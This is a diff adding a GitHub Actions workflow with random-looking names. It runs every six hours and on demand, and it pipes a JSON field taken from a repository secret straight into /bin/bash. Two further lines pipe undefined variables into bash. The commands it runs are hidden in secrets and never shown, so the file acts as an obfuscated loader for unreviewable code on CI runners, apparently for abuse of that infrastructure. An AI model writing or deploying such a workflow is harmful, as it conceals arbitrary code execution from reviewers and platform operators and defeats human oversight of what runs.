@@ -1,0 +1,19 @@
+name: zhoujinwei2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhoujinwei2345
+        env:
+          irr5272: ${{ secrets.irr5272 }}
+        run: |
+          echo $irr5272 | jq -r .cx99055 | /bin/bash
+          echo $paky9 | jq -r .gyg2 | /bin/bash
+          echo $za1 | jq -r .ydpyv955 | /bin/bash
+
